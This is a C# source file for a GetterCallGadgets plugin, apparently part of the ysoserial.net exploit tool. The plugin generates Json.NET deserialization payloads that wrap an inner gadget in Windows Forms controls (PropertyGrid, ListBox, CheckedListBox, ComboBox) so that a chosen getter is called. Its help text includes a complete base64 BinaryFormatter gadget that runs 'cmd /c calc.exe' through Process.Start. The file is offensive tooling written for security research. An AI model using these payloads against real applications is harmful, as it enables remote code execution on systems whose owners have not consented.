using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using NDesk.Options;
using ysoserial.Helpers;

namespace ysoserial.Plugins
{
    // Author: Piotr Bazydlo
    // Implements arbitrary getter call gadgets for .NET 
    // Gadgets implemented for Json.Net only
    // Feel free to implement new gadgets or contribute by adding new formatters (JavaScriptSerializer, MessagePack or any other)
    // On more details about chaining arbitrary getter call gadgets with different gadgets, see: https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf

    public class GetterCallGadgetsPlugin : IPlugin
    {
        private static string file = "";
        private static string gadget = "";
        private static string member = "";
        private static bool showList;
        private static bool test;
        private static bool minify;

        private static readonly OptionSet options = new OptionSet
        {
            {
                "l", "prints list of implemented gadgets", v =>
                {
                    if (v != null) showList = true;
                }
            },
            {"i|inner=", "file containing inner-gadget", v => file = v},
            {"g|gadget=", "gadget to use", v => gadget = v},
            {"m|member=", "getter to call (required for some gadgets)", v => member = v},
            {
                "t", "test gadget (execute)", v =>
                {
                    if (v != null) test = true;
                }
            },
            {
                "minify", "minify gadget", v =>
                {
                    if (v != null) minify = true;
                }
            }
        };

        public string Name()
        {
            return "GetterCallGadgets";
        }

        public string Description()
        {
            return "Implements arbitrary getter call gadgets for .NET Framework and .NET 5/6/7 with WPF enabled, run with -l for more help";
        }
        public string Credit()
        {
            return "Piotr Bazydlo";
        }
        public OptionSet Options()
        {
            return options;
        }

        public string GadgetsList()
        {
            return @"
Plugin allows you to chain any ""insecure serialization"" gadget with the arbitrary getter call gadget. 
You can use this pluing to chain serialization gadgets found in different codebases with arbitrary getter call gadget and reach malicious getter call.
Several chain of gadgets are already implemented in the ysoserial.net, see following gadgets:
- GetterSecurityException
- GetterSettingsPropertyValue
- GetterCompilerResults
- GetterActiveMQObjectMessage in ThirdPartyGadgets plugin

For more information about chaining arbitrary getter call gadgets with insecure getter gadgets, see following white paper (""Arbitrary Getter Call Gadget Idea"" and ""Combining Getter Gadgets with Insecure Serialization Gadgets""): https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf

Gadgets are implemented for Json.NET only, but some of them are applicable to different serializers too (like JavaScriptSerializer or MessagePack).

Gadgets:

    (*) PropertyGrid
        [Finders: Piotr Bazydlo]

    (*) ListBox - requires member to be specified
        [Finders: Piotr Bazydlo]

    (*) CheckedListBox - requires member to be specified
        [Finders: Piotr Bazydlo]

    (*) ComboBox - requires member to be specified (may execute your inner gadget twice)
        [Finders: Piotr Bazydlo]

Exemplary usage: 

    ysoserial.exe -p GetterCallGadgets -l

    Sample gadget generation:

    > cat .\innergadget.json
    {
        '$type':'System.Security.SecurityException',
        'ClassName':'System.Security.SecurityException',
        'Message':'Security error.',
        'InnerException':null,
        'HelpURL':null,
        'StackTraceString':null,
        'RemoteStackTraceString':null,
        'RemoteStackIndex':0,
        'ExceptionMethod':null,
        'HResult':-2146233078,
        'Source':null,
        'Action':0,
        'Method':'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL',
        'Zone':0
    }

    ysoserial.exe -p GetterCallGadgets -g ListBox -m Method -i .\innergadget.json

";
        }

        //PropertyGrid gadget
        public string PropertyGrid(string file)
        {
            return @"
{
    ""$type"":""System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"",
    ""SelectedObjects"":
    [
" + ReadInner(file) + @"
    ]
}";
        }

        //ListBox gadget
        public string ListBox(string file, string member)
        {
            return @"{
    '$type':'System.Windows.Forms.ListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':
    [
" + ReadInner(file) + @"    
    ],
    'DisplayMember':'" + member + @"',
    'Text':'whatever'
}";
        }

        //CheckedListBox gadget
        public string CheckedListBox(string file, string member)
        {
            return @"{
    '$type':'System.Windows.Forms.CheckedListBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':
    [
" + ReadInner(file) + @"    
    ],
    'DisplayMember':'" + member + @"',
    'Text':'whatever'
}";
        }

        public string ComboBox(string file, string member)
        {
            return @"{
    '$type':'System.Windows.Forms.ComboBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
    'Items':
    [
" + ReadInner(file) + @"    
    ],
    'DisplayMember':'" + member + @"',
    'Text':'whatever'
}";
        }

        public string ReadInner(string file)
        {
            return File.ReadAllText(file);
        }

        public object Run(string[] args)
        {

            List<string> extra = options.Parse(args);

            //Print list of gadgets
            if (showList)
            {
                return GadgetsList();
            }

            //inputs verification
            try
            {
                if (string.IsNullOrWhiteSpace(gadget)) throw new ArgumentException("A gadget name must be provided.");

                if ((gadget.ToLower() == "listbox" || gadget.ToLower() == "checkedlistbox" || gadget.ToLower() == "combobox") && string.IsNullOrWhiteSpace(member)) throw new ArgumentException("Member has to be provided for the " + gadget + " gadget");

                if (string.IsNullOrWhiteSpace(file)) throw new ArgumentException("File with inner gadget has to be provided.");
            }
            catch (Exception e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " -l' for the list of implemented gadgets");
                Environment.Exit(-1);
            }


            //gadgets generation
            String payload = "";

            if (gadget.ToLower() == "propertygrid")
            {
                payload = PropertyGrid(file);
            }
            else if (gadget.ToLower() == "listbox")
            {
                payload = ListBox(file, member);
            }
            else if (gadget.ToLower() == "checkedlistbox")
            {
                payload = CheckedListBox(file, member);
            }
            else if (gadget.ToLower() == "combobox")
            {
                payload = ComboBox(file, member);
            }
            else
            {
                Console.WriteLine("Gadget " + gadget + " does not exist! Use -l option to show available gadgets");
                Environment.Exit(-1);
            }

            //minify
            if (minify)
            {
                //If different formatters get implemented, please make sure that we verify formatter here
                payload = JsonHelper.Minify(payload, null, null);
            }

            //tests
            if (test)
            {
                try
                {
                    SerializersHelper.JsonNet_deserialize(payload);
                }
                catch (Exception err)
                {
                    Debugging.ShowErrors(new InputArgs(), err);
                }                
            }

            return payload;
        }
    }
}